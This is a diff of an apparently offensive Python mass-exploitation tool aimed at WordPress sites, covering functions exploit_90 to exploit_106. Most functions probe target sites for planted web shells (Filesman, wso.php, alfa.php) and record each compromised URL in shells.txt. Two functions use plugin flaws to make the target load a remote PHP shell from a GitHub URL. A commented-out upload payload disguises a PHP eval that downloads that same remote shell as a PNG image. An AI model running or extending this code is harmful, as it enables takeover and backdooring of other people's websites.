+        check = requests.get(url+'/wp-admin/241.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 90 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-admin/241.php\n')
+                write_to_file('shells.txt', url + '/wp-admin/241.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-admin/241.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-admin/241.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 90 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-admin/241.php\n')
+                    write_to_file('shells.txt', url + '/wp-admin/241.php')
             else:
                 print ('[#] Exploit 90 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2029,17 +2029,17 @@ def exploit_91(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/24.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/24.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 91 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/24.php\n')
+                write_to_file('shells.txt', url + '/24.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/24.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/24.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 91 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/24.php\n')
+                    write_to_file('shells.txt', url + '/24.php')
             else:
                 print ('[#] Exploit 91 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2051,17 +2051,17 @@ def exploit_92(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/241.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/241.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 92 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/241.php\n')
+                write_to_file('shells.txt', url + '/241.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/241.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/241.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 92 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/241.php\n')
+                    write_to_file('shells.txt', url + '/241.php')
             else:
                 print ('[#] Exploit 92 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2073,17 +2073,17 @@ def exploit_93(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/406',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/406',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 93 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/406\n')
+                write_to_file('shells.txt', url + '/406')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/406',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/406',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 93 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/406\n')
+                    write_to_file('shells.txt', url + '/406')
             else:
                 print ('[#] Exploit 93 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2095,17 +2095,17 @@ def exploit_94(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 94 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/1.php\n')
+                write_to_file('shells.txt', url + '/1.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 94 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/1.php\n')
+                    write_to_file('shells.txt', url + '/1.php')
             else:
                 print ('[#] Exploit 94 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2117,17 +2117,17 @@ def exploit_95(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/x.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/x.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 95 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/x.php\n')
+                write_to_file('shells.txt', url + '/x.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/x.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/x.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 95 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/x.php\n')
+                    write_to_file('shells.txt', url + '/x.php')
             else:
                 print ('[#] Exploit 95 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2139,17 +2139,17 @@ def exploit_96(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/c.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/c.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 96 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/c.php\n')
+                write_to_file('shells.txt', url + '/c.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/c.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/c.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 96 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/c.php\n')
+                    write_to_file('shells.txt', url + '/c.php')
             else:
                 print ('[#] Exploit 96 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2161,17 +2161,17 @@ def exploit_97(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/z.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/z.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 97 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/z.php\n')
+                write_to_file('shells.txt', url + '/z.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/z.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/z.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 97 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/z.php\n')
+                    write_to_file('shells.txt', url + '/z.php')
             else:
                 print ('[#] Exploit 97 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2183,17 +2183,17 @@ def exploit_98(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/bp.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/bp.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 98 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/bp.php\n')
+                write_to_file('shells.txt', url + '/bp.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/bp.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/bp.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 98 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/bp.php\n')
+                    write_to_file('shells.txt', url + '/bp.php')
             else:
                 print ('[#] Exploit 98 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2205,17 +2205,17 @@ def exploit_99(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/alfa.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/alfa.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 99 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/alfa.php\n')
+                write_to_file('shells.txt', url + '/alfa.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/alfa.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/alfa.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 99 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/alfa.php\n')
+                    write_to_file('shells.txt', url + '/alfa.php')
             else:
                 print ('[#] Exploit 99 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2227,17 +2227,17 @@ def exploit_100(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wso.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wso.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 100 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wso.php\n')
+                write_to_file('shells.txt', url + '/wso.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wso.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wso.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 100 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wso.php\n')
+                    write_to_file('shells.txt', url + '/wso.php')
             else:
                 print ('[#] Exploit 100 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2249,17 +2249,17 @@ def exploit_101(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 101 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/404.php\n')
+                write_to_file('shells.txt', url + '/404.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 101 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/404.php\n')
+                    write_to_file('shells.txt', url + '/404.php')
             else:
                 print ('[#] Exploit 101 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2271,17 +2271,17 @@ def exploit_102(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/mu-plugins/s.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/mu-plugins/s.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 102 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/mu-plugins/s.php\n')
+                write_to_file('shells.txt', url + '/wp-content/mu-plugins/s.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/mu-plugins/s.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/mu-plugins/s.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 102 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/mu-plugins/s.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/mu-plugins/s.php')
             else:
                 print ('[#] Exploit 102 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2293,17 +2293,17 @@ def exploit_103(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,timeout=5)
         if ('mini shell by h0rn3t sp1d3rs ' in check.content.decode("utf-8")):
                 print (' [#] Exploit 103 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\n')
+                write_to_file('shells.txt', url + '/wp/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'mini shell by h0rn3t sp1d3rs' in check.content.decode("utf-8"):
                     print (' [#] Exploit 103 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\n')
+                    write_to_file('shells.txt', url + '/wp/wordpress/wp-admin/admin-ajax.php?action=ime_test_im_path&cli_path=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php')
             else:
                 print ('[#] Exploit 103 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2314,17 +2314,17 @@ def exploit_104(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,timeout=5)
         if ('mini shell by h0rn3t sp1d3rs' in check.content.decode("utf-8")):
                 print (' [#] Exploit 104 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'mini shell by h0rn3t sp1d3rs ' in check.content.decode("utf-8"):
                     print (' [#] Exploit 104 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php')
             else:
                 print ('[#] Exploit 104 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2335,17 +2335,17 @@ def exploit_105(url):
         # try with http
         
         url = 'http://' + URLdomain(url)
-        check = requests.get(url+'/wp-content/themes/beauty-premium/includes/shell.php',headers=headers, allow_redirects=True,timeout=15)
+        check = requests.get(url+'/wp-content/themes/beauty-premium/includes/shell.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 105 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/themes/beauty-premium/includes/shell.php\n')
+                write_to_file('shells.txt', url + '/wp-content/themes/beauty-premium/includes/shell.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
-            check = requests.get(url+'/wp-content/themes/beauty-premium/includes/shell.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
+            check = requests.get(url+'/wp-content/themes/beauty-premium/includes/shell.php',headers=headers, allow_redirects=True,verify=False ,timeout=5)
             if 'Filesman' in check.content.decode("utf-8"):
                     print (' [#] Exploit 105 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                    open('shells.txt', 'a').write(url + '/wp-content/themes/beauty-premium/includes/shell.php\n')
+                    write_to_file('shells.txt', url + '/wp-content/themes/beauty-premium/includes/shell.php')
             else:
                 print ('[#] Exploit 105 --> ' + url + ' {}[Failed]'.format(fr))
     except:
@@ -2359,21 +2359,21 @@ def exploit_106(url):
         url = 'http://' + URLdomain(url)
         # data = """--------------------------66e3ca93281c7050\\Content-Disposition: form-data; name=\cmd\\\\\upload\\--------------------------66e3ca93281c7050\\Content-Disposition: form-data; name=\target\\\\\l1_Lw\\--------------------------66e3ca93281c7050\\Content-Disposition: form-data; name=\upload[]\; filename=\spamtools.be.php\\\Content-Type: image/png\\\\\89PNG\\\1a\\00\00\00\IHDR\00\00\01^\00\00\01^\04\03\00\00\00?\05j)\00\00\00\1ePLTE\ff\ff\ff\ef\ef\ef\e5\e5\e5\ce\ce\ce\a1\a1\a1iiiVVVGGG333\00\00\00g\00\cc\e2\00\00\\c0IDATx\da\ed]K[\db\c8\12m\c9\ce^\c6\90\bb58\\dc\9dm\9c\\d9\d9X\1e\c2\8e\87I\c22\!\93\e5@xmc\02\f1\da\0f\a9\ff\ed]`\eb\ddVU\c9C\b5\e6\a2-\d4\a7\f2Q\e9\a8\1fuN\8b\df\b9\ba\ee\84\bc\^\d7\83\c7\8f\bc\9a\08\a7\b1F\bb\aa\97\f4\c8:5\f2^L,A\bb\8cSr\e4\055\d2\bc\17\0eC\be\e4H\f3NL*\8f\8f\d2i\be\f05Y\f05\ffM\f5[*\95J\b9\c1\b7\dc\b4\8f\de\9f\1e\f5\ec\86\95\83\fa\adv\ff\92\d3\cb\fd\ba]\d1\86\1f\92Q2\eck\19\b8\dc\93FB\a4>\f5[\de\91\91k\d2\d1\18\df\eaG\19\bb\dcCK\d7\fa-\97\12\90\b0.\fcP>\9629a-\f9\d7\dc\95\8a\cb\dd\d6\11\df\1d\a9\bc&5\fd\ea\f7\e5@\9d\af\bc\ad\e8\c6\0f\85c9\ef:\d0\8c\8d\9d\b9\e9J\a7\a6\17\be\cb\83\f9\f9\ca[\ad\ea\d7\d8MIW\ba-\9d\f8\e1\85L\bdn-}\f87\1d^)eK\1f|\97\01\e9\fa\15\cc_\bf\10x\a5[\d3\85\1f\\03H\be\f2\\17\fe}\03JW\8e+z\e0k\1c\c3\f2\95m=\ea\b7\08LW\8e\f4\e0\87-h\be\d3{1\f3\af\-\07)\f7t\c0\17\\0eR\f6u\a8\dfux\be\0f\8b\b7\bc\fc\00\fa\16\87\be\c9\bc\fc\0b\fcX<\\9f\f8\f1E\94\ef\94\d1x\eb\f7\&\df\b1\c5\ce\0f\98\f2\95\b2\c6\cd\bf\c6wT\be\fb\dc\f8\16P\e9\ca\9f\dc\f5\bb\8c\cbw\c4\cd\0f\1b\b8|\c7\163\ff\be\c5\e5\eb\d6x\f15p\f4 e\8b\b7~\91\f4 e\9b\97\1f\cc\012\df\bfy\f9\17IgR\f6y\f1]\c6\e6;\e4\ad\dfg\d8|G\16+?\ac`\f3\1d\f3\f2\ef::_^|\b7\b0\f9:\16k\fd\be\c5\e6\ebV\b2\f0Yf|\f1\f9\d6X\f1\c5~\8e\a5\cc\19\be2o\f8\d6\84q\c9\87/%_\f3k\8e\f8![=<>\be\cc\fc@\e13\ce\ef\1b\e5{\c1\89\ef\066\df\/\ffR\c6;\9c\f8\aeP\c6\bf\8c\f8\e2\c7\eb\bc\f3\8b\z>\c4\8b\ef#\cf73\e3\8b\9e\cf\12\ac\f8\1a\c7\c8|\99\d7w\04a=\8a\13_\f4z_\85\19\dfW\f8\f5T\ce\f1/e\bd\9as\fc\8b%\b43\c1\8c/\92 \f6\d8\f7\e7\f1\fbY\bc\fbo\af\b0\af\1b\f3\fe&j\041\14\ec\fb\c7\e6\\\df\03\c1\df\1f\b5\8b,_\ee\fe(D\01?tt1\f7\97<f?\ccB\fa\a3\8e1\83\1d\\faS\d7\11sc\1d\f0-\e2\ca\81\bd\bf\0f\bc'\db\8eF\f2\e0+\fe\c0\f5{\b2\f7\a7\16`\9f\8c\cfB\13|\c5;\d0\cePM\e8Q\bfB\14\07\f0\b7M\0b}\00\e0\8ds\eb\de/\e5\d7\b7,\a7\03|+4\c2\d7H\ad`\b7\b6\88|\17\a6\1fJ\ad\e0sK\11\c9\82o*\07\8f\03z'-\f4\b1)z\b2mu$\0f\be\f3_\b9\1f\d6\9cH\16|\85x\9d\fe%\d6\86\1f\84\10\c2Tr\c4\a4\1d\fe\a5\9a\e8\bb\0b\ef@\f2X}\fc\\ca\1f\93\d3]\9c^z\c1\fa\f9$\84\9d\8e\05\88d\c1W\88\a5n\94%~m\c7#5\f2\d70\9a\a1\9apz\15h$\0b\beB\88B\f3\c3\0c\e3\bb^\03\13\c9\81\af\10B\946\edn\f7\a8kw\d6p\bf\94\07\dfi\ceB\fd\d7\bc\f9\1b\e5\cd'o\feFF\de\f0\fd\f2\e7rVK\b4k\e9\b4B\8d\bc\a4\de\b3p/\dc\afG\b4\eb\fd\e0\e8\f1#'B\deS\bd\f4\e45\d5\bf\cf\a5\de\f3\da\11\0e\d9K\ef\94\1c\f9m\8d\1ay\97\b3\f7\ed>\83\1f\de\d3\f7\ed\e9\fb\f6\f4}\8b\fcimssss\cd\caE\fd\1ae\fb\fd\f5@J\f7\fe\c8n\e8?\fe-\07\ad\f4\eez\ab\da\e0\9b<\bfhF\16/~u,\8d\f15^\0f\e26o\15m\eb\d7\f83ie(\b6\18\a0\0b?$\a7+e\cf\d2\92\\e5Rl\c4\aaP\13|\d5\d6t\ee\be\86\f5[\9c\b3\9d\eb\d4\b5\e3\07s\eef\e3\a8\a2\1b\ff\be\9e\bf\b3t\a8\19\bei\9b\fbA/H\1d\ea\f7\1d|#W\07~H\df\da\0f:\ff\f1\f3/\a0u\e2V#|!\9d\13>\c0\fc\f5\fbN\a2:=\b8\f9\01\d6\f9\e3\f5\\b0\f3/\b0\f7\f2\b3&\f8B\9b\c9\c7\96\1e\f5\0b\ee\0cl\e9<?php @eval(\?>\.file_get_contents(\https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\));?>\\--------------------------66e3ca93281c7050--\\"""
         #
-        # ck = requests.post(url+'/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',headers=headers,data=data, allow_redirects=True,timeout=15)
-        check = requests.get(url+'/wp-content/plugins/wp-file-manager/lib/php/h0rn3t.php',headers=headers, allow_redirects=True,timeout=15)
+        # ck = requests.post(url+'/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',headers=headers,data=data, allow_redirects=True,timeout=5)
+        check = requests.get(url+'/wp-content/plugins/wp-file-manager/lib/php/h0rn3t.php',headers=headers, allow_redirects=True,timeout=5)
         if ('Filesman' in check.content.decode("utf-8")):
                 print (' [#] Exploit 106 --> ' + url + ' {}[Succefully]'.format(fg)) 
-                open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-file-manager/lib/php/h0rn3t.php\n')
+                write_to_file('shells.txt', url + '/wp-content/plugins/wp-file-manager/lib/php/h0rn3t.php')
         # try with https 
         else:
             url = 'https://' + URLdomain(url)
             #
             # data = """--------------------------66e3ca93281c7050\\Content-Disposition: form-data; name=\cmd\\\\\upload\\--------------------------66e3ca93281c7050\\Content-Disposition: form-data; name=\target\\\\\l1_Lw\\--------------------------66e3ca93281c7050\\Content-Disposition: form-data; name=\upload[]\; filename=\spamtools.be.php\\\Content-Type: image/png\\\\\89PNG\\\1a\\00\00\00\IHDR\00\00\01^\00\00\01^\04\03\00\00\00?\05j)\00\00\00\1ePLTE\ff\ff\ff\ef\ef\ef\e5\e5\e5\ce\ce\ce\a1\a1\a1iiiVVVGGG333\00\00\00g\00\cc\e2\00\00\\c0IDATx\da\ed]K[\db\c8\12m\c9\ce^\c6\90\bb58\\dc\9dm\9c\\d9\d9X\1e\c2\8e\87I\c22\!\93\e5@xmc\02\f1\da\0f\a9\ff\ed]`\eb\ddVU\c9C\b5\e6\a2-\d4\a7\f2Q\e9\a8\1fuN\8b\df\b9\ba\ee\84\bc\^\d7\83\c7\8f\bc\9a\08\a7\b1F\bb\aa\97\f4\c8:5\f2^L,A\bb\8cSr\e4\055\d2\bc\17\0eC\be\e4H\f3NL*\8f\8f\d2i\be\f05Y\f05\ffM\f5[*\95J\b9\c1\b7\dc\b4\8f\de\9f\1e\f5\ec\86\95\83\fa\adv\ff\92\d3\cb\fd\ba]\d1\86\1f\92Q2\eck\19\b8\dc\93FB\a4>\f5[\de\91\91k\d2\d1\18\df\eaG\19\bb\dcCK\d7\fa-\97\12\90\b0.\fcP>\9629a-\f9\d7\dc\95\8a\cb\dd\d6\11\df\1d\a9\bc&5\fd\ea\f7\e5@\9d\af\bc\ad\e8\c6\0f\85c9\ef:\d0\8c\8d\9d\b9\e9J\a7\a6\17\be\cb\83\f9\f9\ca[\ad\ea\d7\d8MIW\ba-\9d\f8\e1\85L\bdn-}\f87\1d^)eK\1f|\97\01\e9\fa\15\cc_\bf\10x\a5[\d3\85\1f\\03H\be\f2\\17\fe}\03JW\8e+z\e0k\1c\c3\f2\95m=\ea\b7\08LW\8e\f4\e0\87-h\be\d3{1\f3\af\-\07)\f7t\c0\17\\0eR\f6u\a8\dfux\be\0f\8b\b7\bc\fc\00\fa\16\87\be\c9\bc\fc\0b\fcX<\\9f\f8\f1E\94\ef\94\d1x\eb\f7\&\df\b1\c5\ce\0f\98\f2\95\b2\c6\cd\bf\c6wT\be\fb\dc\f8\16P\e9\ca\9f\dc\f5\bb\8c\cbw\c4\cd\0f\1b\b8|\c7\163\ff\be\c5\e5\eb\d6x\f15p\f4 e\8b\b7~\91\f4 